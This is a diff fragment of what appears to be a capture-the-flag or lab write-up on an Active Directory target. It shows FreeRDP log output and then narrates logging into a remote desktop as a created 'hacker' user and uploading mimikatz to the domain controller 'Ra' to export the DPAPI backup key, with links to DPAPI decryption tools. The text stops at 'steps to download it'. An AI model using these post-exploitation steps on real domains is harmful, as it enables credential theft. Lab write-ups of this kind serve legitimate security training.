+[23:56:22:061] [318193:318194] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
+[23:56:22:061] [318193:318194] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
+[23:56:23:244] [318193:318194] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
+[23:56:23:245] [318193:318255] [INFO][com.freerdp.channels.rdpdr.client] - Loading device service drive [share] (static)
+[23:56:23:265] [318193:318194] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
+[23:56:23:265] [318193:318194] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
+[23:56:25:356] [318193:318194] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_BUMP_OPTIONS]
+
+Next, we will need to logoff any existing Logon Session by using `logoff Session_ID` command as Windows only allow one logon session per computer unless otherwise configured.
+
+We use `query user` command to check the Logon Session.
+
+Once we Remote Desktop in (for our case, we use the user created above - hacker, rather than login as `chajoh`), we try to open the KeePass however, it prompt error due to masterkey in DPAPI encrypted using user password.
+
+And we overwrite `chajoh` password and the masterkey in DPAPI mis-matched !
+
+We are unable to recovered it, hence we have to go back to the domain controller - `Ra` to get the DPAPI Backup Key.
+
+We access back to `Ra` domain controller and upload mimikatz to the server, then we execute command below to export DPAPI key.
+
+---
+https://jarnobaselier.nl/crack-dpapi-met-cqure-cqtools/
+
+https://github.com/BlackDiverX/cqtools (CQDPAPIBlobSearcher.exe)
+https://cqureacademy.com/tools-from-dpapi-and-dpapi-ng-decryption-toolkit-black-hat-conference-session (CQMasterKeyAD.exe)
+
+steps to download it:
+
